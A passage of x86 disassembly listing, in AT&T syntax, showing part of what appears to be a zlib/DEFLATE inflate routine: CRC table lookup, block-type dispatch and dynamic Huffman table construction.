  405de7:	8b f0                	mov    %eax,%esi
  405de9:	81 e6 ff 00 00 00    	and    $0xff,%esi
  405def:	33 f7                	xor    %edi,%esi
  405df1:	c1 e8 08             	shr    $0x8,%eax
  405df4:	8b 34 b5 70 85 44 00 	mov    0x448570(,%esi,4),%esi
  405dfb:	33 c6                	xor    %esi,%eax
  405dfd:	41                   	inc    %ecx
  405dfe:	4a                   	dec    %edx
  405dff:	75 e3                	jne    0x405de4
  405e01:	5f                   	pop    %edi
  405e02:	f7 d0                	not    %eax
  405e04:	5e                   	pop    %esi
  405e05:	c2 0c 00             	ret    $0xc
  405e08:	55                   	push   %ebp
  405e09:	8b ec                	mov    %esp,%ebp
  405e0b:	83 ec 44             	sub    $0x44,%esp
  405e0e:	8b 45 08             	mov    0x8(%ebp),%eax
  405e11:	53                   	push   %ebx
  405e12:	56                   	push   %esi
  405e13:	57                   	push   %edi
  405e14:	8b 08                	mov    (%eax),%ecx
  405e16:	8d 70 10             	lea    0x10(%eax),%esi
  405e19:	8b 40 04             	mov    0x4(%eax),%eax
  405e1c:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  405e1f:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  405e25:	8b 9e 18 05 00 00    	mov    0x518(%esi),%ebx
  405e2b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  405e2e:	8b 86 1c 05 00 00    	mov    0x51c(%esi),%eax
  405e34:	89 45 c0             	mov    %eax,-0x40(%ebp)
  405e37:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  405e3d:	3b c8                	cmp    %eax,%ecx
  405e3f:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405e42:	73 05                	jae    0x405e49
  405e44:	2b c1                	sub    %ecx,%eax
  405e46:	48                   	dec    %eax
  405e47:	eb 08                	jmp    0x405e51
  405e49:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  405e4f:	2b c1                	sub    %ecx,%eax
  405e51:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405e54:	e9 c3 09 00 00       	jmp    0x40681c
  405e59:	ff 24 85 57 68 40 00 	jmp    *0x406857(,%eax,4)
  405e60:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  405e64:	0f 84 c2 09 00 00    	je     0x40682c
  405e6a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  405e6d:	ff 4d cc             	decl   -0x34(%ebp)
  405e70:	8b cb                	mov    %ebx,%ecx
  405e72:	0f b6 00             	movzbl (%eax),%eax
  405e75:	d3 e0                	shl    %cl,%eax
  405e77:	09 45 c0             	or     %eax,-0x40(%ebp)
  405e7a:	ff 45 c8             	incl   -0x38(%ebp)
  405e7d:	83 c3 08             	add    $0x8,%ebx
  405e80:	83 fb 03             	cmp    $0x3,%ebx
  405e83:	72 db                	jb     0x405e60
  405e85:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405e88:	83 eb 03             	sub    $0x3,%ebx
  405e8b:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  405e8f:	83 e0 07             	and    $0x7,%eax
  405e92:	8b c8                	mov    %eax,%ecx
  405e94:	80 e1 01             	and    $0x1,%cl
  405e97:	f6 d9                	neg    %cl
  405e99:	1b c9                	sbb    %ecx,%ecx
  405e9b:	83 e1 07             	and    $0x7,%ecx
  405e9e:	d1 e8                	shr    $1,%eax
  405ea0:	83 c1 08             	add    $0x8,%ecx
  405ea3:	83 e8 00             	sub    $0x0,%eax
  405ea6:	89 8e 14 05 00 00    	mov    %ecx,0x514(%esi)
  405eac:	0f 84 2e 01 00 00    	je     0x405fe0
  405eb2:	48                   	dec    %eax
  405eb3:	74 56                	je     0x405f0b
  405eb5:	48                   	dec    %eax
  405eb6:	74 48                	je     0x405f00
  405eb8:	48                   	dec    %eax
  405eb9:	0f 85 5d 09 00 00    	jne    0x40681c
  405ebf:	83 cf ff             	or     $0xffffffff,%edi
  405ec2:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  405ec8:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405ecb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405ece:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  405ed4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  405ed7:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  405edd:	89 41 04             	mov    %eax,0x4(%ecx)
  405ee0:	8b 45 08             	mov    0x8(%ebp),%eax
  405ee3:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  405ee6:	50                   	push   %eax
  405ee7:	89 08                	mov    %ecx,(%eax)
  405ee9:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405eec:	89 8e a8 9b 00 00    	mov    %ecx,0x9ba8(%esi)
  405ef2:	e8 a0 09 00 00       	call   0x406897
  405ef7:	8b c7                	mov    %edi,%eax
  405ef9:	5f                   	pop    %edi
  405efa:	5e                   	pop    %esi
  405efb:	5b                   	pop    %ebx
  405efc:	c9                   	leave
  405efd:	c2 04 00             	ret    $0x4
  405f00:	c7 06 0b 00 00 00    	movl   $0xb,(%esi)
  405f06:	e9 11 09 00 00       	jmp    0x40681c
  405f0b:	80 3d f8 9a 44 00 00 	cmpb   $0x0,0x449af8
  405f12:	0f 85 a0 00 00 00    	jne    0x405fb8
  405f18:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405f1c:	b8 78 89 44 00       	mov    $0x448978,%eax
  405f21:	3d b4 8b 44 00       	cmp    $0x448bb4,%eax
  405f26:	b1 08                	mov    $0x8,%cl
  405f28:	7e 14                	jle    0x405f3e
  405f2a:	3d 78 8d 44 00       	cmp    $0x448d78,%eax
  405f2f:	7d 04                	jge    0x405f35
  405f31:	fe c1                	inc    %cl
  405f33:	eb 09                	jmp    0x405f3e
  405f35:	3d d8 8d 44 00       	cmp    $0x448dd8,%eax
  405f3a:	7d 02                	jge    0x405f3e
  405f3c:	b1 07                	mov    $0x7,%cl
  405f3e:	0f be c9             	movsbl %cl,%ecx
  405f41:	89 08                	mov    %ecx,(%eax)
  405f43:	83 c0 04             	add    $0x4,%eax
  405f46:	3d f8 8d 44 00       	cmp    $0x448df8,%eax
  405f4b:	7c d4                	jl     0x405f21
  405f4d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405f50:	bf 78 89 44 00       	mov    $0x448978,%edi
  405f55:	50                   	push   %eax
  405f56:	68 78 92 44 00       	push   $0x449278
  405f5b:	68 6c 93 40 00       	push   $0x40936c
  405f60:	68 74 89 44 00       	push   $0x448974
  405f65:	68 c8 73 40 00       	push   $0x4073c8
  405f6a:	68 88 73 40 00       	push   $0x407388
  405f6f:	68 01 01 00 00       	push   $0x101
  405f74:	68 20 01 00 00       	push   $0x120
  405f79:	57                   	push   %edi
  405f7a:	e8 80 09 00 00       	call   0x4068ff
  405f7f:	6a 1e                	push   $0x1e
  405f81:	59                   	pop    %ecx
  405f82:	6a 05                	push   $0x5
  405f84:	58                   	pop    %eax
  405f85:	f3 ab                	rep stos %eax,%es:(%edi)
  405f87:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405f8a:	50                   	push   %eax
  405f8b:	68 78 92 44 00       	push   $0x449278
  405f90:	68 70 93 40 00       	push   $0x409370
  405f95:	68 70 89 44 00       	push   $0x448970
  405f9a:	68 44 74 40 00       	push   $0x407444
  405f9f:	68 08 74 40 00       	push   $0x407408
  405fa4:	6a 00                	push   $0x0
  405fa6:	6a 1e                	push   $0x1e
  405fa8:	68 78 89 44 00       	push   $0x448978
  405fad:	e8 4d 09 00 00       	call   0x4068ff
  405fb2:	fe 05 f8 9a 44 00    	incb   0x449af8
  405fb8:	a0 6c 93 40 00       	mov    0x40936c,%al
  405fbd:	88 46 10             	mov    %al,0x10(%esi)
  405fc0:	a0 70 93 40 00       	mov    0x409370,%al
  405fc5:	88 46 11             	mov    %al,0x11(%esi)
  405fc8:	a1 74 89 44 00       	mov    0x448974,%eax
  405fcd:	89 46 14             	mov    %eax,0x14(%esi)
  405fd0:	a1 70 89 44 00       	mov    0x448970,%eax
  405fd5:	89 46 18             	mov    %eax,0x18(%esi)
  405fd8:	83 26 00             	andl   $0x0,(%esi)
  405fdb:	e9 3c 08 00 00       	jmp    0x40681c
  405fe0:	8b cb                	mov    %ebx,%ecx
  405fe2:	c7 06 09 00 00 00    	movl   $0x9,(%esi)
  405fe8:	83 e1 07             	and    $0x7,%ecx
  405feb:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  405fee:	2b d9                	sub    %ecx,%ebx
  405ff0:	e9 27 08 00 00       	jmp    0x40681c
  405ff5:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  405ff9:	0f 84 2d 08 00 00    	je     0x40682c
  405fff:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406002:	ff 4d cc             	decl   -0x34(%ebp)
  406005:	8b cb                	mov    %ebx,%ecx
  406007:	0f b6 00             	movzbl (%eax),%eax
  40600a:	d3 e0                	shl    %cl,%eax
  40600c:	09 45 c0             	or     %eax,-0x40(%ebp)
  40600f:	ff 45 c8             	incl   -0x38(%ebp)
  406012:	83 c3 08             	add    $0x8,%ebx
  406015:	83 fb 10             	cmp    $0x10,%ebx
  406018:	72 db                	jb     0x405ff5
  40601a:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40601d:	33 db                	xor    %ebx,%ebx
  40601f:	25 ff ff 00 00       	and    $0xffff,%eax
  406024:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  406027:	3b c3                	cmp    %ebx,%eax
  406029:	89 46 04             	mov    %eax,0x4(%esi)
  40602c:	0f 84 e9 00 00 00    	je     0x40611b
  406032:	6a 0a                	push   $0xa
  406034:	58                   	pop    %eax
  406035:	e9 e7 00 00 00       	jmp    0x406121
  40603a:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40603e:	0f 84 e8 07 00 00    	je     0x40682c
  406044:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406047:	85 c0                	test   %eax,%eax
  406049:	0f 85 98 00 00 00    	jne    0x4060e7
  40604f:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  406055:	8b 55 d0             	mov    -0x30(%ebp),%edx
  406058:	3b d1                	cmp    %ecx,%edx
  40605a:	75 29                	jne    0x406085
  40605c:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406062:	8d be a0 1b 00 00    	lea    0x1ba0(%esi),%edi
  406068:	3b c7                	cmp    %edi,%eax
  40606a:	74 19                	je     0x406085
  40606c:	8b d7                	mov    %edi,%edx
  40606e:	3b d0                	cmp    %eax,%edx
  406070:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406073:	73 05                	jae    0x40607a
  406075:	2b c2                	sub    %edx,%eax
  406077:	48                   	dec    %eax
  406078:	eb 04                	jmp    0x40607e
  40607a:	2b ca                	sub    %edx,%ecx
  40607c:	8b c1                	mov    %ecx,%eax
  40607e:	85 c0                	test   %eax,%eax
  406080:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406083:	75 62                	jne    0x4060e7
  406085:	ff 75 08             	push   0x8(%ebp)
  406088:	89 96 a8 9b 00 00    	mov    %edx,0x9ba8(%esi)
  40608e:	e8 04 08 00 00       	call   0x406897
  406093:	8b 96 a8 9b 00 00    	mov    0x9ba8(%esi),%edx
  406099:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  40609f:	3b d1                	cmp    %ecx,%edx
  4060a1:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4060a4:	73 07                	jae    0x4060ad
  4060a6:	8b c1                	mov    %ecx,%eax
  4060a8:	2b c2                	sub    %edx,%eax
  4060aa:	48                   	dec    %eax
  4060ab:	eb 08                	jmp    0x4060b5
  4060ad:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  4060b3:	2b c2                	sub    %edx,%eax
  4060b5:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  4060bb:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4060be:	3b d7                	cmp    %edi,%edx
  4060c0:	75 1d                	jne    0x4060df
  4060c2:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4060c8:	3b d1                	cmp    %ecx,%edx
  4060ca:	74 13                	je     0x4060df
  4060cc:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4060cf:	73 07                	jae    0x4060d8
  4060d1:	2b ca                	sub    %edx,%ecx
  4060d3:	49                   	dec    %ecx
  4060d4:	8b c1                	mov    %ecx,%eax
  4060d6:	eb 04                	jmp    0x4060dc
  4060d8:	2b fa                	sub    %edx,%edi
  4060da:	8b c7                	mov    %edi,%eax
  4060dc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4060df:	85 c0                	test   %eax,%eax
  4060e1:	0f 84 61 07 00 00    	je     0x406848
  4060e7:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  4060ea:	72 03                	jb     0x4060ef
  4060ec:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4060ef:	8b 4e 04             	mov    0x4(%esi),%ecx
  4060f2:	3b c8                	cmp    %eax,%ecx
  4060f4:	8b f9                	mov    %ecx,%edi
  4060f6:	72 02                	jb     0x4060fa
  4060f8:	8b f8                	mov    %eax,%edi
  4060fa:	57                   	push   %edi
  4060fb:	ff 75 c8             	push   -0x38(%ebp)
  4060fe:	ff 75 d0             	push   -0x30(%ebp)
  406101:	e8 9e f5 ff ff       	call   0x4056a4
  406106:	01 7d c8             	add    %edi,-0x38(%ebp)
  406109:	29 7d cc             	sub    %edi,-0x34(%ebp)
  40610c:	01 7d d0             	add    %edi,-0x30(%ebp)
  40610f:	29 7d d4             	sub    %edi,-0x2c(%ebp)
  406112:	29 7e 04             	sub    %edi,0x4(%esi)
  406115:	0f 85 01 07 00 00    	jne    0x40681c
  40611b:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  406121:	89 06                	mov    %eax,(%esi)
  406123:	e9 f4 06 00 00       	jmp    0x40681c
  406128:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40612c:	0f 84 fa 06 00 00    	je     0x40682c
  406132:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406135:	ff 4d cc             	decl   -0x34(%ebp)
  406138:	8b cb                	mov    %ebx,%ecx
  40613a:	0f b6 00             	movzbl (%eax),%eax
  40613d:	d3 e0                	shl    %cl,%eax
  40613f:	09 45 c0             	or     %eax,-0x40(%ebp)
  406142:	ff 45 c8             	incl   -0x38(%ebp)
  406145:	83 c3 08             	add    $0x8,%ebx
  406148:	83 fb 0e             	cmp    $0xe,%ebx
  40614b:	72 db                	jb     0x406128
  40614d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406150:	25 ff 3f 00 00       	and    $0x3fff,%eax
  406155:	8b c8                	mov    %eax,%ecx
  406157:	89 46 04             	mov    %eax,0x4(%esi)
  40615a:	83 e1 1f             	and    $0x1f,%ecx
  40615d:	80 f9 1d             	cmp    $0x1d,%cl
  406160:	0f 87 59 fd ff ff    	ja     0x405ebf
  406166:	25 e0 03 00 00       	and    $0x3e0,%eax
  40616b:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  406170:	0f 87 49 fd ff ff    	ja     0x405ebf
  406176:	c1 6d c0 0e          	shrl   $0xe,-0x40(%ebp)
  40617a:	83 eb 0e             	sub    $0xe,%ebx
  40617d:	83 66 08 00          	andl   $0x0,0x8(%esi)
  406181:	c7 06 0c 00 00 00    	movl   $0xc,(%esi)
  406187:	8b 46 04             	mov    0x4(%esi),%eax
  40618a:	c1 e8 0a             	shr    $0xa,%eax
  40618d:	83 c0 04             	add    $0x4,%eax
  406190:	39 46 08             	cmp    %eax,0x8(%esi)
  406193:	73 69                	jae    0x4061fe
  406195:	eb 20                	jmp    0x4061b7
  406197:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40619b:	0f 84 8b 06 00 00    	je     0x40682c
  4061a1:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4061a4:	ff 4d cc             	decl   -0x34(%ebp)
  4061a7:	8b cb                	mov    %ebx,%ecx
  4061a9:	0f b6 00             	movzbl (%eax),%eax
  4061ac:	d3 e0                	shl    %cl,%eax
  4061ae:	09 45 c0             	or     %eax,-0x40(%ebp)
  4061b1:	ff 45 c8             	incl   -0x38(%ebp)
  4061b4:	83 c3 08             	add    $0x8,%ebx
  4061b7:	83 fb 03             	cmp    $0x3,%ebx
  4061ba:	72 db                	jb     0x406197
  4061bc:	8b 4e 08             	mov    0x8(%esi),%ecx
  4061bf:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4061c2:	83 e0 07             	and    $0x7,%eax
  4061c5:	83 eb 03             	sub    $0x3,%ebx
  4061c8:	0f be 89 74 73 40 00 	movsbl 0x407374(%ecx),%ecx
  4061cf:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  4061d3:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  4061d7:	8b 4e 04             	mov    0x4(%esi),%ecx
  4061da:	ff 46 08             	incl   0x8(%esi)
  4061dd:	8b 46 08             	mov    0x8(%esi),%eax
  4061e0:	c1 e9 0a             	shr    $0xa,%ecx
  4061e3:	83 c1 04             	add    $0x4,%ecx
  4061e6:	3b c1                	cmp    %ecx,%eax
  4061e8:	72 cd                	jb     0x4061b7
  4061ea:	eb 12                	jmp    0x4061fe
  4061ec:	8b 46 08             	mov    0x8(%esi),%eax
  4061ef:	0f be 80 74 73 40 00 	movsbl 0x407374(%eax),%eax
  4061f6:	83 64 86 0c 00       	andl   $0x0,0xc(%esi,%eax,4)
  4061fb:	ff 46 08             	incl   0x8(%esi)
  4061fe:	83 7e 08 13          	cmpl   $0x13,0x8(%esi)
  406202:	72 e8                	jb     0x4061ec
  406204:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406207:	8d be 0c 05 00 00    	lea    0x50c(%esi),%edi
  40620d:	51                   	push   %ecx
  40620e:	8d 8e 20 05 00 00    	lea    0x520(%esi),%ecx
  406214:	51                   	push   %ecx
  406215:	8d 8e 10 05 00 00    	lea    0x510(%esi),%ecx
  40621b:	33 c0                	xor    %eax,%eax
  40621d:	57                   	push   %edi
  40621e:	51                   	push   %ecx
  40621f:	50                   	push   %eax
  406220:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406223:	50                   	push   %eax
  406224:	6a 13                	push   $0x13
  406226:	8d 46 0c             	lea    0xc(%esi),%eax
  406229:	6a 13                	push   $0x13
  40622b:	50                   	push   %eax
  40622c:	c7 07 07 00 00 00    	movl   $0x7,(%edi)
  406232:	e8 c8 06 00 00       	call   0x4068ff
  406237:	85 c0                	test   %eax,%eax
  406239:	75 12                	jne    0x40624d
  40623b:	39 07                	cmp    %eax,(%edi)
  40623d:	74 0e                	je     0x40624d
  40623f:	21 46 08             	and    %eax,0x8(%esi)
  406242:	c7 06 0d 00 00 00    	movl   $0xd,(%esi)
  406248:	e9 1d 01 00 00       	jmp    0x40636a
  40624d:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  406253:	e9 c4 05 00 00       	jmp    0x40681c
  406258:	8b 86 0c 05 00 00    	mov    0x50c(%esi),%eax
  40625e:	eb 20                	jmp    0x406280
  406260:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406264:	0f 84 c2 05 00 00    	je     0x40682c
  40626a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40626d:	ff 4d cc             	decl   -0x34(%ebp)
  406270:	0f b6 11             	movzbl (%ecx),%edx
  406273:	8b cb                	mov    %ebx,%ecx
  406275:	d3 e2                	shl    %cl,%edx
  406277:	09 55 c0             	or     %edx,-0x40(%ebp)
  40627a:	ff 45 c8             	incl   -0x38(%ebp)
  40627d:	83 c3 08             	add    $0x8,%ebx
  406280:	3b d8                	cmp    %eax,%ebx
  406282:	72 dc                	jb     0x406260
  406284:	0f b7 04 45 48 93 40 	movzwl 0x409348(,%eax,2),%eax
  40628b:	00 
  40628c:	23 45 c0             	and    -0x40(%ebp),%eax
  40628f:	8b 8e 10 05 00 00    	mov    0x510(%esi),%ecx
  406295:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406298:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  40629c:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4062a0:	83 f8 10             	cmp    $0x10,%eax
  4062a3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4062a6:	73 16                	jae    0x4062be
  4062a8:	8b ca                	mov    %edx,%ecx
  4062aa:	2b da                	sub    %edx,%ebx
  4062ac:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4062af:	8b 4e 08             	mov    0x8(%esi),%ecx
  4062b2:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  4062b6:	ff 46 08             	incl   0x8(%esi)
  4062b9:	e9 ac 00 00 00       	jmp    0x40636a
  4062be:	83 f8 12             	cmp    $0x12,%eax
  4062c1:	75 0c                	jne    0x4062cf
  4062c3:	6a 07                	push   $0x7
  4062c5:	c7 45 f8 0b 00 00 00 	movl   $0xb,-0x8(%ebp)
  4062cc:	58                   	pop    %eax
  4062cd:	eb 2c                	jmp    0x4062fb
  4062cf:	83 c0 f2             	add    $0xfffffff2,%eax
  4062d2:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
  4062d9:	eb 20                	jmp    0x4062fb
  4062db:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4062df:	0f 84 47 05 00 00    	je     0x40682c
  4062e5:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4062e8:	ff 4d cc             	decl   -0x34(%ebp)
  4062eb:	0f b6 39             	movzbl (%ecx),%edi
  4062ee:	8b cb                	mov    %ebx,%ecx
  4062f0:	d3 e7                	shl    %cl,%edi
  4062f2:	09 7d c0             	or     %edi,-0x40(%ebp)
  4062f5:	ff 45 c8             	incl   -0x38(%ebp)
  4062f8:	83 c3 08             	add    $0x8,%ebx
  4062fb:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  4062fe:	3b d9                	cmp    %ecx,%ebx
  406300:	72 d9                	jb     0x4062db
  406302:	8b ca                	mov    %edx,%ecx
  406304:	2b da                	sub    %edx,%ebx
  406306:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406309:	0f b7 0c 45 48 93 40 	movzwl 0x409348(,%eax,2),%ecx
  406310:	00 
  406311:	23 4d c0             	and    -0x40(%ebp),%ecx
  406314:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406317:	2b d8                	sub    %eax,%ebx
  406319:	03 d1                	add    %ecx,%edx
  40631b:	8b c8                	mov    %eax,%ecx
  40631d:	8b 46 04             	mov    0x4(%esi),%eax
  406320:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406323:	8b 4e 08             	mov    0x8(%esi),%ecx
  406326:	8b f8                	mov    %eax,%edi
  406328:	c1 ef 05             	shr    $0x5,%edi
  40632b:	83 e7 1f             	and    $0x1f,%edi
  40632e:	83 e0 1f             	and    $0x1f,%eax
  406331:	8d 84 07 02 01 00 00 	lea    0x102(%edi,%eax,1),%eax
  406338:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  40633b:	3b f8                	cmp    %eax,%edi
  40633d:	0f 87 7c fb ff ff    	ja     0x405ebf
  406343:	83 7d ec 10          	cmpl   $0x10,-0x14(%ebp)
  406347:	75 0f                	jne    0x406358
  406349:	83 f9 01             	cmp    $0x1,%ecx
  40634c:	0f 82 6d fb ff ff    	jb     0x405ebf
  406352:	8b 7c 8e 08          	mov    0x8(%esi,%ecx,4),%edi
  406356:	eb 02                	jmp    0x40635a
  406358:	33 ff                	xor    %edi,%edi
  40635a:	8d 44 8e 0c          	lea    0xc(%esi,%ecx,4),%eax
  40635e:	89 38                	mov    %edi,(%eax)
  406360:	41                   	inc    %ecx
  406361:	83 c0 04             	add    $0x4,%eax
  406364:	4a                   	dec    %edx
  406365:	75 f7                	jne    0x40635e
  406367:	89 4e 08             	mov    %ecx,0x8(%esi)
  40636a:	8b 46 04             	mov    0x4(%esi),%eax
  40636d:	8b 4e 08             	mov    0x8(%esi),%ecx
  406370:	8b d0                	mov    %eax,%edx
  406372:	83 e0 1f             	and    $0x1f,%eax
  406375:	c1 ea 05             	shr    $0x5,%edx
  406378:	83 e2 1f             	and    $0x1f,%edx
  40637b:	8d 84 02 02 01 00 00 	lea    0x102(%edx,%eax,1),%eax
  406382:	3b c8                	cmp    %eax,%ecx
  406384:	0f 82 ce fe ff ff    	jb     0x406258
  40638a:	8b 46 04             	mov    0x4(%esi),%eax
  40638d:	83 a6 10 05 00 00 00 	andl   $0x0,0x510(%esi)
  406394:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  406398:	8b f8                	mov    %eax,%edi
  40639a:	c1 e8 05             	shr    $0x5,%eax
  40639d:	83 e7 1f             	and    $0x1f,%edi
  4063a0:	b9 01 01 00 00       	mov    $0x101,%ecx
  4063a5:	83 e0 1f             	and    $0x1f,%eax
  4063a8:	03 f9                	add    %ecx,%edi
  4063aa:	40                   	inc    %eax
  4063ab:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4063ae:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4063b1:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  4063b7:	52                   	push   %edx
  4063b8:	50                   	push   %eax
  4063b9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4063bc:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  4063c3:	50                   	push   %eax
  4063c4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4063c7:	50                   	push   %eax
  4063c8:	68 c8 73 40 00       	push   $0x4073c8
  4063cd:	68 88 73 40 00       	push   $0x407388
  4063d2:	51                   	push   %ecx
  4063d3:	8d 46 0c             	lea    0xc(%esi),%eax
  4063d6:	57                   	push   %edi
  4063d7:	50                   	push   %eax
  4063d8:	c7 45 f0 06 00 00 00 	movl   $0x6,-0x10(%ebp)
  4063df:	e8 1b 05 00 00       	call   0x4068ff
  4063e4:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4063e8:	75 03                	jne    0x4063ed
  4063ea:	83 c8 ff             	or     $0xffffffff,%eax
  4063ed:	85 c0                	test   %eax,%eax
  4063ef:	0f 85 ca fa ff ff    	jne    0x405ebf
  4063f5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4063f8:	50                   	push   %eax
  4063f9:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  4063ff:	50                   	push   %eax
  406400:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406403:	50                   	push   %eax
  406404:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406407:	50                   	push   %eax
  406408:	68 44 74 40 00       	push   $0x407444
  40640d:	68 08 74 40 00       	push   $0x407408
  406412:	6a 00                	push   $0x0
  406414:	ff 75 ec             	push   -0x14(%ebp)
  406417:	8d 44 be 0c          	lea    0xc(%esi,%edi,4),%eax
  40641b:	50                   	push   %eax
  40641c:	e8 de 04 00 00       	call   0x4068ff
  406421:	85 c0                	test   %eax,%eax
  406423:	0f 85 96 fa ff ff    	jne    0x405ebf
  406429:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40642c:	85 c0                	test   %eax,%eax
  40642e:	75 0c                	jne    0x40643c
  406430:	81 ff 01 01 00 00    	cmp    $0x101,%edi
  406436:	0f 8f 83 fa ff ff    	jg     0x405ebf
  40643c:	8a 4d fc             	mov    -0x4(%ebp),%cl
  40643f:	83 26 00             	andl   $0x0,(%esi)
  406442:	88 46 11             	mov    %al,0x11(%esi)
  406445:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406448:	89 46 14             	mov    %eax,0x14(%esi)
  40644b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40644e:	88 4e 10             	mov    %cl,0x10(%esi)
  406451:	89 46 18             	mov    %eax,0x18(%esi)
  406454:	0f b6 46 10          	movzbl 0x10(%esi),%eax
  406458:	89 46 0c             	mov    %eax,0xc(%esi)
  40645b:	8b 46 14             	mov    0x14(%esi),%eax
  40645e:	89 46 08             	mov    %eax,0x8(%esi)
  406461:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  406467:	8b 46 0c             	mov    0xc(%esi),%eax
  40646a:	eb 20                	jmp    0x40648c
  40646c:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406470:	0f 84 b6 03 00 00    	je     0x40682c
  406476:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406479:	ff 4d cc             	decl   -0x34(%ebp)
  40647c:	0f b6 11             	movzbl (%ecx),%edx
  40647f:	8b cb                	mov    %ebx,%ecx
  406481:	d3 e2                	shl    %cl,%edx
  406483:	09 55 c0             	or     %edx,-0x40(%ebp)
  406486:	ff 45 c8             	incl   -0x38(%ebp)
  406489:	83 c3 08             	add    $0x8,%ebx
  40648c:	3b d8                	cmp    %eax,%ebx
  40648e:	72 dc                	jb     0x40646c
  406490:	0f b7 04 45 48 93 40 	movzwl 0x409348(,%eax,2),%eax
  406497:	00 
  406498:	23 45 c0             	and    -0x40(%ebp),%eax
  40649b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40649e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4064a1:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4064a5:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  4064a8:	2b d9                	sub    %ecx,%ebx
  4064aa:	0f b6 08             	movzbl (%eax),%ecx
  4064ad:	85 c9                	test   %ecx,%ecx
  4064af:	75 12                	jne    0x4064c3
  4064b1:	0f b7 40 02          	movzwl 0x2(%eax),%eax
